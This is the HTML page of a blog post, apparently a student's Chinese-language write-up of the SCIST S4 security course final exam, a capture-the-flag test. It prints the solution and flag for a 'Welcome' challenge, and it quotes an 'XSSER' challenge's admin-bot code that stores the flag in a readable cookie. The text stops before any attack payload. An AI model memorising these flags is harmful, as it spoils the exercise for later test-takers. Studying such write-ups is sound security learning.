@@ -1,0 +1,1190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="CX330, 陳子雋, CX330 universe, CX330 Blog, Blog, CTF, CX330 hacker, hacker">
+    
+    <meta name="author" content="CX330">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+        
+        
+        
+            <link rel="preconnect" href="https://cdn.staticfile.org" crossorigin>
+        
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://cx330.tw/2024/05/28/scist-s4-資訊安全期末考-writeup/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="我在2024參加了SCIST課程，雖然常常聽不懂但感覺還是收穫不少。這是上學期最後的一個考試，透過考試來審查是否可以進入下學期的課程。(很幸運的我有過！雖然我覺得我還得多練)。所以以下是一些我有進展的題目的Write Up。如果發現有錯誤或是哪裡不足，可以在底下留言區留言，我會十分感激！ Welcome這題我們可以從開發者工具發現類似以下的元素。 1&lt;div class&#x3D;&quot;key-">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SCIST S4 資訊安全期末考 Writeup">
+<meta property="og:url" content="https://cx330.tw/2024/05/28/SCIST-S4-%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E8%80%83-Writeup/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="我在2024參加了SCIST課程，雖然常常聽不懂但感覺還是收穫不少。這是上學期最後的一個考試，透過考試來審查是否可以進入下學期的課程。(很幸運的我有過！雖然我覺得我還得多練)。所以以下是一些我有進展的題目的Write Up。如果發現有錯誤或是哪裡不足，可以在底下留言區留言，我會十分感激！ Welcome這題我們可以從開發者工具發現類似以下的元素。 1&lt;div class&#x3D;&quot;key-">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByG6mhhcT.png">
+<meta property="article:published_time" content="2024-05-28T05:33:42.000Z">
+<meta property="article:modified_time" content="2024-06-02T09:19:39.489Z">
+<meta property="article:author" content="CX330">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/ByG6mhhcT.png">
+    
+    
+        <!-- Google tag (gtag.js) -->
+        <script src="https://www.googletagmanager.com/gtag/js?id=G-PM5RRNPNEB"></script>
+        <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-PM5RRNPNEB');
+        </script>
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/assets/favicon.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon.ico">
+    <meta name="theme-color" content="#f5a524">
+    <link rel="shortcut icon" href="/assets/favicon.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            SCIST S4 資訊安全期末考 Writeup -
+        
+        CX330&#39;s Universe
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        CX330&#39;s Universe
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300..700&display=swap" rel="stylesheet">
+    
+    
+    
+
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"cx330.tw","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"18px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":["Hacker"]},"code_block":{"copy":true,"style":"mac","font":{"enable":true,"family":"Fira Code","url":"https://fonts.googleapis.com/css2?family=Fira+Code:wght@300..700&display=swap"}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Recommended Reading","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#f5a524","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":true,"id":"G-PM5RRNPNEB"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"assets/Lakeside_2019_Teal_NoDeer_UHD2.jpg","dark":"assets/lakeside_2019_midnight.jpg"},"title":"Welcome to CX330's Universe","subtitle":{"text":["Build the universe with me","Undergraduate | Hacker | Developer | CTF | Python | JavaScript | C | Java | React |"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":90,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#3c3c3c","dark":"#fff"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"reverse","links":{"github":"https://github.com/CX330Blake","instagram":null,"zhihu":null,"twitter":null,"email":null,"facebook":"https://www.facebook.com/profile.php?id=100011698690769","fa-brands fa-linkedin-in":"https://www.linkedin.com/in/%E5%AD%90%E9%9B%8B-%E9%99%B3-11087825b/","fa-regular fa-envelope":"mailto:timchen975@gmail.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"Interstellar","artist":"Hans Zimmer","url":"https://cx330.tw/assets/interstellar.mp3","cover":"https://i.kfs.io/playlist/global/71096193v1/cropresize/600x600.jpg","lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#b2d8d8","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house-heart"},"Tree":{"path":"/archives","icon":"fa-light fa-timeline-arrow"},"categories":{"path":"/categories","icon":"fa-solid fa-folder-heart"},"About":{"icon":"fa-regular fa-planet-ringed","submenus":{"Whoami":"/whoami","Ls":"/ls","Github":"https://github.com/CX330Blake","Friends":"/links"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"0xDEADBEEF","show_on_mobile":false,"links":{"Tree":{"path":"/archives","icon":"fa-light fa-timeline-arrow"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-solid fa-folder-heart"}}},"article_date_format":"YYYY-MM-DD","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/5/28 02:31:17"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/assets/favicon.ico">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                CX330&#39;s Universe
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house-heart fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-light fa-timeline-arrow fa-fw"></i>
+                                    TREE
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-solid fa-folder-heart fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-planet-ringed fa-fw"></i>
+                                    ABOUT
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/whoami">
+                                                    WHOAMI
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/ls">
+                                                    LS
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://github.com/CX330Blake">
+                                                    GITHUB
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/links">
+                                                    FRIENDS
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house-heart fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                TREE
+                            </span>
+                            
+                                <i class="fa-light fa-timeline-arrow fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-solid fa-folder-heart fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/whoami">WHOAMI</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/ls">LS</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://github.com/CX330Blake">GITHUB</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/links">FRIENDS</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">5</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">SCIST S4 資訊安全期末考 Writeup</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/assets/favicon.ico">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">CX330</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Hacker</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-05-28 13:33:42</span>
+        <span class="mobile">2024-05-28 13:33:42</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-06-02 17:19:39</span>
+            <span class="mobile">2024-06-02 17:19:39</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/CyberSec/">CyberSec</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/CyberSec/CTF/">CTF</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Security/">Security</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>2.2k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>9 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <p>我在2024參加了SCIST課程，雖然常常聽不懂但感覺還是收穫不少。這是上學期最後的一個考試，透過考試來審查是否可以進入下學期的課程。(很幸運的我有過！雖然我覺得我還得多練)。所以以下是一些我有進展的題目的Write Up。如果發現有錯誤或是哪裡不足，可以在底下留言區留言，我會十分感激！</p>
+<h1 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h1><p>這題我們可以從開發者工具發現類似以下的元素。</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;key--double&quot;</span> <span class="attr">data-key</span>=<span class="string">&quot;49&quot;</span> <span class="attr">data-input</span>=<span class="string">&quot;?F&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span>!<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>再透過以下的index.js代碼可以找到真正的input。</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key.<span class="title function_">hasAttribute</span>(<span class="string">&quot;data-input&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="property">shiftKey</span>) &#123;</span><br><span class="line">            msg += key.<span class="title function_">getAttribute</span>(<span class="string">&quot;data-input&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            msg += key.<span class="title function_">getAttribute</span>(<span class="string">&quot;data-input&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        typingElement.<span class="property">innerHTML</span> = msg.<span class="title function_">replace</span>(<span class="regexp">/ /g</span>, <span class="string">&quot;&amp;nbsp;&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+<p>每個標籤的data-input屬性是由兩個字符所組成，以上面的html標籤為例，當我們按著shift的時候按下數字1按鍵，實際的input會是<code>?</code>，也就是index為0的位置；但當我們只是單純按下數字1按鍵的時候，input會是<code>F</code>，就是index為1的位置。</p>
+<p>知道了這個特性後，翻找到一份index.css文件，將其打開會發現第一行有個註解，以下:</p>
+<div class="highlight-container" data-rel="Css"><figure class="iseeu highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Passpharse : &quot;JP Jf3j-F@%#$4H%xw&quot; */</span></span><br></pre></td></tr></table></figure></div>
+<p>我們用一般打字的方法，用shift切換大小寫，嘗試輸入Passphrase。經過以上的轉換，便可以得到flag。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag = SCIST&#123;G0oD_1u(k_!&#125;</span><br></pre></td></tr></table></figure></div>
+<h1 id="XSSER"><a href="#XSSER" class="headerlink" title="XSSER"></a>XSSER</h1><p>看了題目給的app.js檔案，可以發現Flag是在visit函數裡面被設定的，如下。</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">visit</span>(<span class="params">noteId</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="string">`http://127.0.0.1:3000/note/<span class="subst">$&#123;noteId&#125;</span>`</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] Visiting <span class="subst">$&#123;url&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">const</span> context = <span class="keyword">await</span> browser.<span class="title function_">createIncognitoBrowserContext</span>()</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> context.<span class="title function_">newPage</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">setCookie</span>(&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;flag&#x27;</span>, <span class="attr">value</span>: <span class="variable constant_">FLAG</span>,</span><br><span class="line">        <span class="attr">domain</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">        <span class="attr">httpOnly</span>: <span class="literal">false</span>, <span class="attr">secure</span>: <span class="literal">false</span>, <span class="attr">sameSite</span>: <span class="string">&#x27;Lax&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">goto</span>(url, &#123; <span class="attr">waitUntil</span>: <span class="string">&#x27;networkidle0&#x27;</span> &#125;)</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`[+] error visting <span class="subst">$&#123;path&#125;</span> `</span>, e)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">close</span>()</span><br><span class="line">    <span class="keyword">await</span> context.<span class="title function_">close</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>而要觸發這個visit函數，必須在回報note的地方輸入一個正確合法的ID，才會執行visit函數，程式碼如下。</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/report&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; id &#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable constant_">NOTES</span>.<span class="title function_">has</span>(id)) <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;Note not found&quot;</span>);</span><br><span class="line">    <span class="title function_">visit</span>(id);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Admin will check your report&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>
+<p>接著先在網站嘗試隨意POST一個正常的note，會發現網址變成了以下的形式。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab.scist.org:20001/note/732733d42c28d7060c71be53a4dd491b</span><br></pre></td></tr></table></figure></div>
+<p>其中”note&#x2F;“路徑後面的<code>1e9dafbc67ea0516bacce8d5d36a3c7a</code>，便是一個合法的note ID。</p>
